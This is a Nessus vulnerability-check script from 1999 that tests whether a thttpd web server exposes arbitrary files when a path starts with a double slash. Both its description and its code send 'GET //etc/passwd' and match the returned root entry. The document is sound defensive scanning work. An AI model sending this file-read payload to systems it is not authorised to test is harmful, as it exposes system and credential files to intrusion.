#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10286);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CAN-1999-1457");
 
 name["english"] = "thttpd flaw";
 name["francais"] = "Problème de thttpd";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The remote HTTP server
allows an attacker to read arbitrary files
on the remote web server, simply by adding
a slash in front of its name. 
Example:
	GET //etc/passwd 

will return /etc/passwd.

Solution : upgrade your web server or change it.

Risk factor : Serious";

 desc["francais"] = "Le serveur HTTP distant
permet à un pirate de lire des fichiers
arbitraires, en rajoutant simplement un
slash au début de son nom.
Exemple :
	GET //etc/passwd
	
retournera /etc/passwd.

Solution : Mettez à jour votre server web ou changez-le.
Facteur de risque : sérieux";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "thttpd flaw";
 summary["francais"] = "Trou de sécurité de thttpd";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if(get_port_state(port))
{
 soc = http_open_socket(port);
 if(soc)
 {
  buf = http_get(item:"//etc/passwd", port:port);
  send(socket:soc, data:buf);
  rep = http_recv(socket:soc);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))security_hole(port);
  http_close_socket(soc);
 }
}
